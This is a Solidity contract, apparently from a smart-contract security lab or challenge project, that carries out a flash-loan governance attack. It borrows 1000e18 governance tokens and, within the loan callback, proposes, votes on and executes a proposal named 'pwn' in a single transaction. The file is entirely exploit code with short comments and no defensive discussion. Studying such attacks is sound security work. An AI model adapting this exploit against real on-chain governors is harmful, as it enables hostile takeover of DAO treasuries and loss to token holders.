// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Governor} from "../src/Governor.sol";
import {GovToken} from "../src/GovToken.sol";
import {TokenFlashProvider} from "../src/TokenFlashProvider.sol";
import {IFlashBorrower} from "../src/IFlashBorrower.sol";

contract GovAttack {
    Governor public gov;
    GovToken public token;
    TokenFlashProvider public provider;
    bytes32 public constant PROPOSAL_ID = keccak256("pwn");

    constructor(address _gov, address _token, address _provider) {
        gov = Governor(_gov);
        token = GovToken(_token);
        provider = TokenFlashProvider(_provider);
    }

    function attack() external {
        token.approve(address(provider), type(uint256).max);
        provider.flashLoan(1000e18);
    }

    function execute() external {
        // Called by provider with borrowed 1000e18 tokens
        // Own 1000e18 + borrowed 1000e18 = 2000e18 voting power
        gov.propose(PROPOSAL_ID);
        gov.vote(PROPOSAL_ID, true);
        gov.execute(PROPOSAL_ID);
        // Provider's require check confirms repayment
    }
}